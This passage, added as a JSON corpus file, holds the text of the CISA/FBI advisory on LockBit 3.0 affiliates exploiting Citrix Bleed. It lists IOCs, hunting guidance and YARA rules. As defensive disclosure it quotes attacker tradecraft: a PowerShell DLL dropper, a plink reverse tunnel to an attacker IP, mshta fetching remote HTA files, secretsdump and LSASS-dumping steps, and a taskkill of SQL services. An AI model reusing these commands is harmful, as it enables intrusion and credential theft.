@@ -1,0 +1,542 @@
+[
+ {
+  "id": "p1",
+  "text": "# #StopRansomware: LockBit 3.0 Ransomware Affiliates Exploit CVE 2023-4966 Citrix Bleed Vulnerability"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing — advisory id AA23-325A\n> - Date: 2023-11-21\n> - URL: https://www.ic3.gov/CSA/2023/231121.pdf\n> - PDF SHA-256: b5159af4166487c3cd940ce44a4e481acece31e83119499e50eac791eae42e54 (`source.pdf`, 19 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (39 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Authored by:                                                                                      TLP:CLEAR              Product ID: AA23-325A\n                                                                                                                            November 21, 2023"
+ },
+ {
+  "id": "p4",
+  "text": "#StopRansomware: LockBit 3.0 Ransomware\n        Affiliates Exploit CVE 2023-4966 Citrix Bleed\n        Vulnerability\n        SUMMARY\n        Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to\n        publish advisories for network defenders that detail various ransomware variants and ransomware\n        threat actors. These #StopRansomware advisories include recently and historically observed tactics,\n        techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations\n        protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and\n        to learn more about other ransomware threats and no-cost resources.\n        The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI),\n        Multi-State Information Sharing & Analysis Center (MS-ISAC), and Australian Signals Directorate’s\n        Australian Cyber Security Center (ASD’s ACSC) are releasing this joint Cybersecurity Advisory (CSA)\n        to disseminate IOCs, TTPs, and detection methods associated with LockBit 3.0 ransomware\n        exploiting CVE-2023-4966, labeled Citrix Bleed, affecting Citrix NetScaler web application delivery\n        control (ADC) and NetScaler Gateway appliances."
+ },
+ {
+  "id": "p5",
+  "text": "This CSA provides TTPs and IOCs obtained from FBI, ACSC, and voluntarily shared by Boeing.\n        Boeing observed LockBit 3.0 affiliates exploiting CVE-2023-4966, to obtain initial access to Boeing\n        Distribution Inc., its parts and distribution business that maintains a separate environment. Other\n        trusted third parties have observed similar activity impacting their organization."
+ },
+ {
+  "id": "p6",
+  "text": "Historically, LockBit 3.0 affiliates have conducted attacks against organizations of varying sizes\n        across multiple critical infrastructure sectors, including education, energy, financial services, food and\n        agriculture, government and emergency services, healthcare, manufacturing, and transportation.\n        Observed TTPs for LockBit ransomware attacks can vary significantly in observed TTPs."
+ },
+ {
+  "id": "p7",
+  "text": "U.S. organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory,\n        contact your local FBI field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available,\n        please include the following information regarding the incident: date, time, and location of the incident; type of activity;\n        number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and\n        a designated point of contact. SLTT organizations should report incidents to MS-ISAC (866-787-4722 or\n        SOC@cisecurity.org).\n        This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries\n        minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to\n        standard copyright rules, TLP:CLEAR information may be distributed without restrictions. For more information on the Traffic\n        Light Protocol, see cisa.gov/tlp/."
+ },
+ {
+  "id": "p8",
+  "text": "TLP:CLEAR                                                                                       CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p9",
+  "text": "Citrix Bleed, known to be leveraged by LockBit 3.0 affiliates, allows threat actors to bypass password\n       requirements and multifactor authentication (MFA), leading to successful session hijacking of\n       legitimate user sessions on Citrix NetScaler web application delivery control (ADC) and Gateway\n       appliances. Through the takeover of legitimate user sessions, malicious actors acquire elevated\n       permissions to harvest credentials, move laterally, and access data and resources."
+ },
+ {
+  "id": "p10",
+  "text": "CISA and the authoring organizations strongly encourage network administrators to apply the\n       mitigations found in this CSA, which include isolating NetScaler ADC and Gateway appliances and\n       applying necessary software updates through the Citrix Knowledge Center."
+ },
+ {
+  "id": "p11",
+  "text": "The authoring organizations encourage network defenders to hunt for malicious activity on their\n       networks using the detection methods and IOCs within this CSA. If a potential compromise is\n       detected, organizations should apply the incident response recommendations. If no compromise is\n       detected, organizations should immediately apply patches made publicly available."
+ },
+ {
+  "id": "p12",
+  "text": "TECHNICAL DETAILS\n       Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See the MITRE\n       ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE\n       ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE\n       ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping\n       and CISA’s Decider Tool."
+ },
+ {
+  "id": "p13",
+  "text": "CVE-2023-4966\n       CVE-2023-4966 is a software vulnerability found in Citrix NetScaler ADC and NetScaler Gateway\n       appliances with exploitation activity identified as early as August 2023. This vulnerability provides\n       threat actors, including LockBit 3.0 ransomware affiliates, the capability to bypass MFA [T1556.006]\n       and hijack legitimate user sessions [T1563].\n       After acquiring access to valid cookies, LockBit 3.0 affiliates establish an authenticated session within\n       the NetScaler appliance without a username, password, or access to MFA tokens [T1539]. Affiliates\n       acquire this by sending an HTTP GET request with a crafted HTTP Host header, leading to a\n       vulnerable appliance returning system memory information [T1082]. The information obtained through\n       this exploit contains a valid NetScaler AAA session cookie.\n       Citrix publicly disclosed CVE-2023-4966 on Oct. 10, 2023, within their Citrix Security Bulletin, which\n       issued guidance, and detailed the affected products, IOCs, and recommendations. Based on widely\n       available public exploits and evidence of active exploitation, CISA added this vulnerability to\n       the Known Exploited Vulnerabilities (KEVs) Catalog. This critical vulnerability exploit impacts the\n       following software versions [1]:\n           •    NetScaler ADC and NetScaler Gateway 14.1 before 14.1-8.50\n           •    NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.15\n           •    NetScaler ADC and NetScaler Gateway 13.0 before 13.0-92.19\n           •    NetScaler ADC and NetScaler Gateway version 12.1 (EOL)\n           •    NetScaler ADC 13.1FIPS before 13.1-37.163"
+ },
+ {
+  "id": "p14",
+  "text": "TLP:CLEAR                                                                                        CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p15",
+  "text": "•    NetScaler ADC 12.1-FIPS before 12.1-55.300\n           •    NetScaler ADC 12.1-NDcPP before 12.1-55.300\n       Due to the ease of exploitation, CISA and the authoring organizations expect to see widespread\n       exploitation of the Citrix vulnerability in unpatched software services throughout both private and\n       public networks."
+ },
+ {
+  "id": "p16",
+  "text": "Threat Actor Activity\n       Malware identified in this campaign is generated beginning with the execution of a PowerShell script\n       (123.ps1) which concatenates two base64 strings together, converts them to bytes, and writes them\n       to the designated file path.\n                        $y = \"TVqQAAMA...<long base64 string>\"\n                        $x = \"RyEHABFQ...<long base64 string>\"\n                        $filePath = \"C:\\Users\\Public\\adobelib.dll\"\n                        $fileBytes = [System.Convert]::FromBase64String($y + $x)\n                        [System.IO.File]::WriteAllBytes($filePath, $fileBytes)"
+ },
+ {
+  "id": "p17",
+  "text": "The resulting file (adobelib.dll) is then executed by the PowerShell script using rundll32.\n       rundll32 C:\\Users\\Public\\adobelib.dll,main <104 hex char key>\n       The Dynamic Link Library (DLL) will not execute correctly without the 104 hex character key.\n       Following execution, the DLL attempts to send a POST request to https://adobe-us-\n       updatefiles[.]digital/index.php which resolves to IP addresses 172.67.129[.]176 and 104.21.1[.]180 as\n       of November 16, 2023. Although adobelib.dll and the adobe-us-updatefiles[.]digital have the\n       appearance of legitimacy, the file and domain have no association with legitimate Adobe software and\n       no identified interaction with the software.\n       Other observed activities include the use of a variety of TTPs commonly associated with ransomware\n       activity. For example, LockBit 3.0 affiliates have been observed using AnyDesk and Splashtop remote\n       management and monitoring (RMM), Batch and PowerShell scripts, the execution of HTA files using\n       the Windows native utility mshta.exe and other common software tools typically associated with\n       ransomware incidents."
+ },
+ {
+  "id": "p18",
+  "text": "INDICATORS OF COMPROMISE (IOCS)\n       See Table 1–Table 5 for IOCs related to Lockbit 3.0 affiliate exploitation of CVE-2023-4966.\n       [Fidelity] Legend:\n           •    High = Indicator is unique or highly indicates LockBit in an environment.\n           •    Medium = Indicator was used by LockBit but is used outside of LockBit activity, albeit rarely.\n           •    Low = Indicates tools that are commonly used but were used by LockBit."
+ },
+ {
+  "id": "p19",
+  "text": "TLP:CLEAR                                                                                                CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p20",
+  "text": "Low confidence indicators may not be related to ransomware.\n                                        Table 1: LockBit 3.0 Affiliate Citrix Bleed Campaign"
+ },
+ {
+  "id": "p21",
+  "text": "Indicator                Type                 Fidelity Description\n        192.229.221[.]95 IP                           Low        Mag.dll calls out to this IP address. Ties back to\n                                                                 dns0.org. Should run this DLL in a sandbox,\n                                                                 when possible, to confirm C2. IP is shared\n                                                                 hosting.\n        123.ps1                  PowerShell           High       Creates and executes payload via script.\n                                 script\n        193.201.9[.]224          IP                   High       FTP to Russian geolocated IP from compromised\n                                                                 system\n        62.233.50[.]25           IP                   High       Russian geolocated IP from compromised system\n                                                                 Hxxp://62.233.50[.]25/en-us/docs.html\n                                                                 Hxxp://62.233.50[.]25/en-us/test.html\n        51.91.79[.].17           IP                   Med        Temp.sh IP\n        Teamviewer               Tool (Remote         Low\n                                 Admin)\n        70.37.82[.]20            IP                   Low        IP was seen from a known compromised account\n                                                                 reaching out to an Altera IP address. LockBit is\n                                                                 known to leverage Altera, a remote admin tool,\n                                                                 such as Anydesk, team viewer, etc.\n        185.17.40[.]178          IP                   Low        Teamviewer C2, ties back to a polish service\n                                                                 provider, Artnet Sp. Zo.o. Polish IP address"
+ },
+ {
+  "id": "p22",
+  "text": "Table 2: LockBit 3.0 Affiliate Citrix Bleed Campaign"
+ },
+ {
+  "id": "p23",
+  "text": "Indicator           Type         Fideli   Description\n                                         ty\n        185.229.191.        Anydes       High     Anydesk C2\n        41                  k Usage\n        81.19.135[.]2       IP           High     Russian geolocated IP\n        19                                        hxxp://81.19.135[.]219/F8PtZ87fE8dJWqe.hta\n                                                  Hxxp://81.19.135[.]219:443/q0X5wzEh6P7.hta\n        45.129.137[.]       IP           Mediu    Callouts from known compromised device beginning during the\n        233                              m        compromised window."
+ },
+ {
+  "id": "p24",
+  "text": "TLP:CLEAR                                                                                               CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p25",
+  "text": "185.229.191[.       Anydes        High     Anydesk C2\n        ]41                 k Usage\n        Plink.exe           Comma         High     Plink (PuTTY Link) is a command-line connection tool, similar to\n                            nd                     UNIX SSH. It is mostly used for automated operations, such as\n                            interpret              making CVS access a repository on a remote server. Plink can\n                            er                     be used to automate SSH actions and for remote SSH\n                                                   tunneling on Windows.\n        AnyDeskMSI.         Remote        High     We do see that AnyDeskMSI.exe was installed as a service\n        exe                 admin                  with \"auto start\" abilities for persistence. Config file from the\n                            tool                   image could be leveraged to find the ID and Connection IP, but\n                                                   we do not have that currently.\n        SRUtility.exe       Splasht                9b6b722ba4a691a2fe21747cd5b8a2d18811a173413d4934949\n                            op utility             047e04e40b30a\n        Netscan exe         Network       High     498ba0afa5d3b390f852af66bd6e763945bf9b6bff2087015ed86\n                            scannin                12a18372155\n                            g\n                            softwar\n                            e"
+ },
+ {
+  "id": "p26",
+  "text": "Table 3: LockBit 3.0 Affiliate Citrix Bleed Campaign"
+ },
+ {
+  "id": "p27",
+  "text": "Indicator                        Type                       Fidelity   Description\n        Scheduled task:                  Persistence                High\n        \\MEGA\\MEGAcmd\n        Scheduled task:                  Persistence                High\n        UpdateAdobeTask\n        Mag.dll                          Persistence                High       Identified as running within\n                                                                               UpdateAdobeTask\n                                                                               cc21c77e1ee7e916c9c48194fad\n                                                                               083b2d4b2023df703e544ffb2d6\n                                                                               a0bfc90a63"
+ },
+ {
+  "id": "p28",
+  "text": "123.ps1                          Script                     High       Creates rundll32\n                                                                               C:\\Users\\Public\\adobelib.dl\n                                                                               l,main\n                                                                               ed5d694d561c97b4d70efe93493\n                                                                               6286fe562addf7d6836f795b336\n                                                                               d9791a5c44"
+ },
+ {
+  "id": "p29",
+  "text": "TLP:CLEAR                                                                                   CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p30",
+  "text": "Adobelib.dll                   Persistence      Low        C2 from adobelib.dll."
+ },
+ {
+  "id": "p31",
+  "text": "Adobe-us-                      Tool Download    High       Used to download obfuscated\n        updatefiles[.]digital                                      toolsets\n        172.67.129[.]176               Tool Download    High       IP of adobe-us-updatefiles[.]digital\n        104.21.1[.]180                 Tool Download    High       Adobe-us-updatefiles[.]digital\n        cmd.exe /q /c cd 1>            Command          High       wmiexec.exe usage\n        \\\\127.0.0.1\\admin$\\__\n        1698617793[.]44\n        2>&1"
+ },
+ {
+  "id": "p32",
+  "text": "cmd.exe /q /c cd \\ 1>          Command          High       wmiexec.exe usage\n        \\\\127.0.0.1\\admin$\\__\n        1698617793[.]44\n        2>&1"
+ },
+ {
+  "id": "p33",
+  "text": "cmd.exe /q /c query            Command          High       wmiexec.exe usage\n        user 1>\n        \\\\127.0.0.1\\admin$\\__\n        1698617793[.]44\n        2>&1"
+ },
+ {
+  "id": "p34",
+  "text": "cmd.exe /q /c taskkill         Command          High       wmiexec.exe usage\n        /f /im sqlwriter.exe /im\n        winmysqladmin.exe\n        /im w3sqlmgr.exe /im\n        sqlwb.exe /im\n        sqltob.exe /im\n        sqlservr.exe /im\n        sqlserver.exe /im\n        sqlscan.exe /im\n        sqlbrowser.exe /im\n        sqlrep.exe /im\n        sqlmangr.exe /im\n        sqlexp3.exe /im\n        sqlexp2.exe /im sqlex"
+ },
+ {
+  "id": "p35",
+  "text": "cmd.exe /q /c cd \\ 1>          Command          High       wmiexec.exe usage\n        \\\\127.0.0.1\\admin$\\__\n        1698618133[.]54\n        2>&1"
+ },
+ {
+  "id": "p36",
+  "text": "The authoring organizations recommended monitoring/reviewing traffic to the 81.19.135[.]* class C\n       network and review for MSHTA being called with HTTP arguments [3]."
+ },
+ {
+  "id": "p37",
+  "text": "TLP:CLEAR                                                                                              CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p38",
+  "text": "Table 4: LockBit 3.0 Affiliate Citrix Bleed Campaign"
+ },
+ {
+  "id": "p39",
+  "text": "Indicator                       Type           Fidelity   Description                  Notes\n        81.19.135[.]219                 IP             High       Russian geolocated IP\n                                                                  used by user to request\n                                                                  mshta with http arguments\n                                                                  to download random\n                                                                  named HTA file named\n                                                                  q0X5wzzEh6P7.hta\n        81.19.135[.]220                 IP             High       Russian geolocated IP,       IP registered to a\n                                                                  seen outbound in logs        South African\n                                                                                               Company\n        81.19.135[.]226                 IP             High       Russian geolocated IP,       IP registered to a\n                                                                  seen outbound in logs        South African\n                                                                                               Company\n                                       Table 5: Citrix Bleed Indicators of Compromise (IOCs)"
+ },
+ {
+  "id": "p40",
+  "text": "Type                             Indicator                               Description"
+ },
+ {
+  "id": "p41",
+  "text": "Filename                         c:\\users\\<username>\\downloads\\pr        Process hacker\n                                         ocess hacker 2\\peview.exe"
+ },
+ {
+  "id": "p42",
+  "text": "Filename                         c:\\users\\<username>\\music\\proces        Process hacker\n                                         s hacker 2\\processhacker.exe"
+ },
+ {
+  "id": "p43",
+  "text": "Filename                         psexesvc.exe                            Psexec service excutable"
+ },
+ {
+  "id": "p44",
+  "text": "Filename                         c:\\perflogs\\processhacker.exe           Process hacker"
+ },
+ {
+  "id": "p45",
+  "text": "Filename                         c:\\windows\\temp\\screenconnect\\23        Process hacker transferred via\n                                         .8.5.8707\\files\\processhacker.exe       screenconnect"
+ },
+ {
+  "id": "p46",
+  "text": "Filename                         c:\\perflogs\\lsass.dmp                   Lsass dump"
+ },
+ {
+  "id": "p47",
+  "text": "Filename                         c:\\users\\<username>\\downloads\\mi        Mimikatz\n                                         mikatz.exe"
+ },
+ {
+  "id": "p48",
+  "text": "Filename                         c:\\users\\<username>\\desktop\\proc        Procdump\n                                         64\\proc.exe"
+ },
+ {
+  "id": "p49",
+  "text": "TLP:CLEAR                                                                                      CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p50",
+  "text": "Filename                       c:\\users\\<username>\\documents\\v   Decrypt veeam creds\n                                       eeam-get-creds.ps1"
+ },
+ {
+  "id": "p51",
+  "text": "Filename                       secretsdump.py                    Impacket installed on azure vm"
+ },
+ {
+  "id": "p52",
+  "text": "Cmdline                        secretsdump.py                    Impacket installed on azure vm\n                                       <domain>/<username>@<ip> -\n                                       outputfile 1"
+ },
+ {
+  "id": "p53",
+  "text": "Filename                       ad.ps1                            Adrecon found in powershell\n                                                                         transcripts"
+ },
+ {
+  "id": "p54",
+  "text": "Filename                       c:\\perflogs\\64-bit\\netscan.exe    Softperfect netscan"
+ },
+ {
+  "id": "p55",
+  "text": "Filename                       tniwinagent.exe                   Total network inventory agent"
+ },
+ {
+  "id": "p56",
+  "text": "Filename                       psexec.exe                        Psexec used to deploy\n                                                                         screenconnect"
+ },
+ {
+  "id": "p57",
+  "text": "Filename                       7z.exe                            Used to compress files"
+ },
+ {
+  "id": "p58",
+  "text": "Tool                           Action1                           RMM"
+ },
+ {
+  "id": "p59",
+  "text": "Tool                           Atera                             RMM"
+ },
+ {
+  "id": "p60",
+  "text": "tool                           anydesk                           rmm"
+ },
+ {
+  "id": "p61",
+  "text": "tool                           fixme it                          rmm"
+ },
+ {
+  "id": "p62",
+  "text": "tool                           screenconnect                     rmm"
+ },
+ {
+  "id": "p63",
+  "text": "tool                           splashtop                         rmm"
+ },
+ {
+  "id": "p64",
+  "text": "tool                           zoho assist                       rmm"
+ },
+ {
+  "id": "p65",
+  "text": "TLP:CLEAR                                                                                      CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p66",
+  "text": "ipv4                           101.97.36[.]61                     zoho assist"
+ },
+ {
+  "id": "p67",
+  "text": "ipv4                           168.100.9[.]137                    ssh portforwarding infra"
+ },
+ {
+  "id": "p68",
+  "text": "ipv4                           185.20.209[.]127                   zoho assist"
+ },
+ {
+  "id": "p69",
+  "text": "ipv4                           185.230.212[.]83                   zoho assist"
+ },
+ {
+  "id": "p70",
+  "text": "ipv4                           206.188.197[.]22                   powershell reverse shell seen in\n                                                                          powershell logging"
+ },
+ {
+  "id": "p71",
+  "text": "ipv4                           54.84.248[.]205                    fixme ip"
+ },
+ {
+  "id": "p72",
+  "text": "Ipv4                           141.98.9[.]137                     Remote IP for CitrixBleed"
+ },
+ {
+  "id": "p73",
+  "text": "domain                         assist.zoho.eu                     zoho assist"
+ },
+ {
+  "id": "p74",
+  "text": "filename                       c:\\perflogs\\1.exe                  connectwise renamed"
+ },
+ {
+  "id": "p75",
+  "text": "filename                       c:\\perflogs\\run.exe                screenconnect pushed by psexec"
+ },
+ {
+  "id": "p76",
+  "text": "filename                       c:\\perflogs\\64-bit\\m.exe           connectwise renamed"
+ },
+ {
+  "id": "p77",
+  "text": "filename                       c:\\perflogs\\64-bit\\m0.exe          connectwise renamed"
+ },
+ {
+  "id": "p78",
+  "text": "filename                       c:\\perflogs\\za_access_my_departm   zoho remote assist\n                                       ent.exe"
+ },
+ {
+  "id": "p79",
+  "text": "filename                       c:\\users\\<username>\\music\\za_acc   zoho remote assist\n                                       ess_my_department.exe"
+ },
+ {
+  "id": "p80",
+  "text": "filename                       c:\\windows\\servicehost.exe         plink renamed"
+ },
+ {
+  "id": "p81",
+  "text": "TLP:CLEAR                                                                                                CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p82",
+  "text": "filename                          c:\\windows\\sysconf.bat                 runs servicehost.exe (plink)\n                                                                                 command"
+ },
+ {
+  "id": "p83",
+  "text": "filename                          c:\\windows\\temp\\screenconnect\\23       zoho remote assist used to transfer\n                                          .8.5.8707\\files\\azure.msi              data via screenconnect"
+ },
+ {
+  "id": "p84",
+  "text": "cmdline                           echo enter |                           plink port forwarding\n                                          c:\\windows\\servicehost.exe -ssh -r\n                                          8085:127.0.0.1:8085\n                                          <username>@168.100.9[.]137 -pw\n                                          <password>"
+ },
+ {
+  "id": "p85",
+  "text": "domain                            eu1-dms.zoho[.]eu                      zoho assist"
+ },
+ {
+  "id": "p86",
+  "text": "domain                            fixme[.]it                             fixme it"
+ },
+ {
+  "id": "p87",
+  "text": "domain                            unattended.techninline[.]net           fixme it"
+ },
+ {
+  "id": "p88",
+  "text": "MITRE ATT&CK TACTICS AND TECHNIQUES\n       See Table 6 and Table 7 for all referenced threat actor tactics and techniques in this advisory.\n                                        Table 6: ATT&CK Techniques for Enterprise: Discovery"
+ },
+ {
+  "id": "p89",
+  "text": "Technique Title                        ID                                       Use"
+ },
+ {
+  "id": "p90",
+  "text": "System Information                      T1082            Threat actors will attempt to obtain information\n        Discovery                                                about the operating system and hardware,\n                                                                 including versions, and patches."
+ },
+ {
+  "id": "p91",
+  "text": "Table 7: ATT&CK Techniques for Enterprise: Credential Access"
+ },
+ {
+  "id": "p92",
+  "text": "Technique Title                            ID            Use"
+ },
+ {
+  "id": "p93",
+  "text": "Modify Authentication                 T1556.006          Threat actors leverage vulnerabilities found within\n        Process: Multifactor                                     CVE- to compromise, modify, and/or bypass\n        Authentication                                           multifactor authentication to hijack user sessions,"
+ },
+ {
+  "id": "p94",
+  "text": "TLP:CLEAR                                                                                           CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p95",
+  "text": "harvest credentials, and move laterally, which\n                                                            enables persistent access."
+ },
+ {
+  "id": "p96",
+  "text": "Steal Web Session                  T1539            Threat actors with access to valid cookies can\n        Cookie                                              establish an authenticated session within the\n                                                            NetScaler appliance without a username,\n                                                            password, or access to multifactor authentication\n                                                            (MFA) tokens."
+ },
+ {
+  "id": "p97",
+  "text": "DETECTION METHODS\n       Hunting Guidance\n       Network defenders should prioritize observing users in session when hunting for network anomalies.\n       This will aid the hunt for suspicious activity such as installing tools on the system (e.g., putty, rClone ),\n       new account creation, log item failure, or running commands such as hostname, quser, whoami, net,\n       and taskkill. Rotating credentials for identities provisioned for accessing resources via a vulnerable\n       NetScaler ADC or Gateway appliance can also aid in detection.\n       For IP addresses:\n           •    Identify if NetScaler logs the change in IP.\n           •    Identify if users are logging in from geolocations uncommon for your organization’s user base.\n           •    If logging VPN authentication, identify if users are associated with two or more public IP\n                addresses while in a different subnet or geographically dispersed.\n       Note: MFA to NetScaler will not operate as intended due to the attacker bypassing authentication by\n       providing a token/session for an already authenticated user.\n       The following procedures can help identify potential exploitation of CVE-2023-4966 and LockBit 3.0\n       activity:\n           •    Search for filenames that contain tf0gYx2YI for identifying LockBit encrypted files.\n           •    LockBit 3.0 actors were seen using the C:\\Temp directory for loading and the execution of\n                files.\n           •    Investigate requests to the HTTP/S endpoint from WAF.\n           •    Hunt for suspicious login patterns from NetScaler logs\n           •    Hunt for suspicious virtual desktop agent Windows Registry keys\n           •    Analyze memory core dump files.\n       Below, are CISA developed YARA rules and an open-source rule that may be used to detect\n       malicious activity in the Citrix NetScaler ADC and Gateway software environment. For more\n       information on detecting suspicious activity within NetScaler logs or additional resources, visit CISA’s\n       Malware Analysis Report or the resource section of this CSA [2]:"
+ },
+ {
+  "id": "p98",
+  "text": "TLP:CLEAR                                                                                                   CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p99",
+  "text": "YARA Rules\n       CISA received four files for analysis that show files being used to save registry hives, dump the Local\n       Security Authority Subsystem Service (LSASS) process memory to disk, and attempt to establish\n       sessions via Windows Remote Management (WinRM). The files include:"
+ },
+ {
+  "id": "p100",
+  "text": "•    Windows Batch file (.bat)\n           •    Windows Executable (.exe)\n           •    Windows Dynamic Link Library (.dll)\n           •    Python Script (.py)"
+ },
+ {
+  "id": "p101",
+  "text": "rule CISA_10478915_01 : trojan installs_other_components\n        {\n        meta:\n        author = \"CISA Code & Media Analysis\"\n        incident = \"10478915\"\n        date = \"2023-11-06\"\n        last_modified = \"20231108_1500\"\n        actor = \"n/a\"\n        family = \"n/a\"\n        capabilities = \"installs-other-components\"\n        malware_Type = \"trojan\"\n        tool_type = \"information-gathering\"\n        description = \"Detects trojan .bat samples\"\n        sha256 = \"98e79f95cf8de8ace88bf223421db5dce303b112152d66ffdf27ebdfcdf967e9\"\n        strings:\n        $s1 = { 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 73 5c 7a 2e 74 78 74 }\n        $s2 = { 72 65 67 20 73 61 76 65 20 68 6b 6c 6d 5c 73 79 73 74 65 6d 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b\n        5c 65 6d }\n        $s3 = { 6d 61 6b 65 63 61 62 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 61 2e 70 6e 67 20 63 3a 5c 77 69 6e\n        6f 77 73 5c 74 61 73 6b 73 5c 61 2e 63 61 62 }\n        condition:\n        all of them\n        }"
+ },
+ {
+  "id": "p102",
+  "text": "This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file\n       called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path\n       C:\\Windows\\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0[.]1 three\n       times.\n       The next command it runs is reg save to save the HKLM\\SYSTEM registry hive into the\n       C:\\Windows\\tasks\\em directory. Again, a.bat pings the loop back address 127.0.0[.]1 one time before\n       executing another reg save command and saves the HKLM\\SAM registry hive into the\n       C:\\Windows\\Task\\am directory. Next, a.bat runs three makecab commands to create three cabinet\n       (.cab) files from the previously mentioned saved registry hives and one file named\n       C:\\Users\\Public\\a.png. The names of the .cab files are as follows:"
+ },
+ {
+  "id": "p103",
+  "text": "•    c:\\windows\\tasks\\em.cab"
+ },
+ {
+  "id": "p104",
+  "text": "TLP:CLEAR                                                                                                     CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p105",
+  "text": "•    c:\\windows\\tasks\\am.cab\n           •    c:\\windows\\tasks\\a.cab"
+ },
+ {
+  "id": "p106",
+  "text": "rule CISA_10478915_02 : trojan installs_other_components\n        {\n        meta:\n        author = \"CISA Code & Media Analysis\"\n        incident = \"10478915\"\n        date = \"2023-11-06\"\n        last_modified = \"20231108_1500\"\n        actor = \"n/a\"\n        family = \"n/a\"\n        capabilities = \"installs-other-components\"\n        malware_type = \"trojan\"\n        tool_type = \"unknown\"\n        description = \"Detects trojan PE32 samples\"\n        sha256 = \"e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068\"\n        strings:\n        $s1 = { 57 72 69 74 65 46 69 6c 65 }\n        $s2 = { 41 70 70 50 6f 6c 69 63 79 47 65 74 50 72 6f 63 65 73 73 54 65 72 6d 69 6e 61 74 69 6f 6e 4d 65 74 68 6f 64 }\n        $s3 = { 6f 70 65 72 61 74 6f 72 20 63 6f 5f 61 77 61 69 74 }\n        $s4 = { 43 6f 6d 70 6c 65 74 65 20 4f 62 6a 65 63 74 20 4c 6f 63 61 74 6f 72 }\n        $s5 = { 64 65 6c 65 74 65 5b 5d }\n        $s6 = { 4e 41 4e 28 49 4e 44 29 }\n        condition:\n        uint16(0) == 0x5a4d and pe.imphash() == \"6e8ca501c45a9b85fff2378cffaa24b2\" and pe.size_of_code == 84480 and all\n        of\n        them\n        }"
+ },
+ {
+  "id": "p107",
+  "text": "This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file\n       issues the remote procedure call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file\n       path to the LSASS on the infected machine. Once the file path is returned, the malware loads the\n       accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded,\n       then the malware outputs the message \"[*]success\" in the console."
+ },
+ {
+  "id": "p108",
+  "text": "rule CISA_10478915_03 : trojan steals_authentication_credentials credential_exploitation\n        {\n        meta:\n        author = \"CISA Code & Media Analysis\"\n        incident = \"10478915\"\n        date = \"2023-11-06\"\n        last_modified = \"20231108_1500\"\n        actor = \"n/a\"\n        family = \"n/a\"\n        capabilities = \"steals-authentication-credentials\"\n        malware_type = \"trojan\"\n        tool_type = \"credential-exploitation\"\n        description = \"Detects trojan DLL samples\"\n        sha256 = \"17a27b1759f10d1f6f1f51a11c0efea550e2075c2c394259af4d3f855bbcc994\"\n        strings:\n        $s1 = { 64 65 6c 65 74 65 }\n        $s2 = { 3c 2f 74 72 75 73 74 49 6e 66 6f 3e }\n        $s3 = { 42 61 73 65 20 43 6c 61 73 73 20 44 65 73 63 72 69 70 74 6f 72 20 61 74 20 28 }\n        $s4 = { 49 6e 69 74 69 61 6c 69 7a 65 43 72 69 74 69 63 61 6c 53 65 63 74 69 6f 6e 45 78 }\n        $s5 = { 46 69 6e 64 46 69 72 73 74 46 69 6c 65 45 78 57 }\n        $s6 = { 47 65 74 54 69 63 6b 43 6f 75 6e 74 }"
+ },
+ {
+  "id": "p109",
+  "text": "TLP:CLEAR                                                                                               CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p110",
+  "text": "condition:\n        uint16(0) == 0x5a4d and pe.subsystem == pe.SUBSYSTEM_WINDOWS_CUI and pe.size_of_code == 56832 and all of\n        them\n        }"
+ },
+ {
+  "id": "p111",
+  "text": "This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file\n       a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file\n       a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\\Users\\Public."
+ },
+ {
+  "id": "p112",
+  "text": "Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process\n       memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete,\n       the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path\n       C:\\Windows\\Tasks."
+ },
+ {
